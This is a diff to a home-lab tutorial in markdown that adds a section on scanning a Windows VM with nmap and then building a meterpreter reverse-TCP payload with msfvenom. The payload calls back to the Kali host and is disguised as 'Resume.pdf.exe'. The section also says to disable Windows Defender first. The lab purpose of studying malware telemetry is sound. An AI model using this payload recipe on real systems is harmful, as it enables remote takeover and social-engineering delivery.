@@ -98,7 +98,26 @@ To check the settings, open the command prompt-> ipconfig, and you should see yo
 - Select IPv4 Settings -> Method select Manual
 - Addresses -> Add -> 192.168.20.11, Netmask ->24 -> Save
 
-Open terminal run ifconfig and check the IP address.
+Open a terminal, run ifconfig, and check the IP address.
+
+## Network Scanning with Nmap, Malware Analysis, and analysis of generated telemetry on Windows machine
+Here we are using Nmap in Kali to scan the open ports available on Windows, and creating and analysing our own malware to observe the telemetry it generates on Windows machine.
+Before deploying the malware, disable Windows Defender to establish reverse TCP connection.
+
+#### On Kali Linux Demo
+- Open terminal, enter *nmap -h*, which shows available options for nmap
+- To scan Windows, enter *nmap 192.168.20.10 -Pn* to identify open ports
+- Here, RDP port 3389 is open on Windows
+- Now we can create malware on Kali to perform an attack on the target Windows system
+
+##### Creation of basic malware 
+- Use msfvenom to create a malware and a meterpreter reverse shell as a payload
+- On Kali -> terminal -> enter msfvenom
+- terminal -> msfvenom -l payloads, which gives a list of payloads
+- Here we are using *windows/x64/meterpreter_reverese_tcp*
+- In the terminal, enter
+  
+     *msfvenom -p windows/x64/meterpreter_reverse_tcp lhost-192.168.20.11 lport-4444 -f exe -o Resume.pdf.exe*
  
 
   
